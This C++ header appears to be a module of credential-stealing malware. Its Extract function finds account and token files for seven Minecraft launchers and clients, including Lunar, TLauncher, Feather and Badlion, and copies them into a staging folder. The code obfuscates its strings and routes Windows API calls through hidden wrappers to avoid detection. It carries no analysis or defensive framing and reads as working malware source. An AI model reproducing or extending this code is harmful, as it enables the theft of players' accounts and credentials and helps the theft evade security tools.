#ifndef MINECRAFT_HPP
#define MINECRAFT_HPP

#include <string>
#include <map>
#include <filesystem>
#include <cstdlib>
#include "Winapi_structs.hpp"

namespace fs = std::filesystem;

namespace Minecraft {
    inline void Extract(const std::string& baseDir) {
        char* userProfile = nullptr;
        size_t len = 0;
        _dupenv_s(&userProfile, &len, OBF("USERPROFILE"));

        if (!userProfile) return;

        std::string userProfilePath = std::string(userProfile);
        free(userProfile);

        std::map<std::string, std::string> minecraftPaths = {
            {OBF("Intent"), userProfilePath + "\\" + OBF("intentlauncher\\launcherconfig")},
            {OBF("Lunar"), userProfilePath + "\\" + OBF(".lunarclient\\settings\\game\\accounts.json")},
            {OBF("TLauncher"), userProfilePath + "\\" + OBF("AppData\\Roaming\\.minecraft\\TlauncherProfiles.json")},
            {OBF("Feather"), userProfilePath + "\\" + OBF("AppData\\Roaming\\.feather\\accounts.json")},
            {OBF("Meteor"), userProfilePath + "\\" + OBF("AppData\\Roaming\\.minecraft\\meteor-client\\accounts.nbt")},
            {OBF("Impact"), userProfilePath + "\\" + OBF("AppData\\Roaming\\.minecraft\\Impact\\alts.json")},
            {OBF("Badlion"), userProfilePath + "\\" + OBF("AppData\\Roaming\\Badlion Client\\accounts.json")}
        };

        std::string targetDir = baseDir + "\\" + OBF("Minecraft");
        HiddenCalls::CreateDirectoryA(targetDir.c_str(), NULL);

        for (const auto& entry : minecraftPaths) {
            std::string path = entry.second;
            if (fs::exists(path)) {
                std::string destination = targetDir + "\\" + fs::path(path).filename().string();
                HiddenCalls::CopyFileA(path.c_str(), destination.c_str(), FALSE);
            }
        }
    }
}

#endif
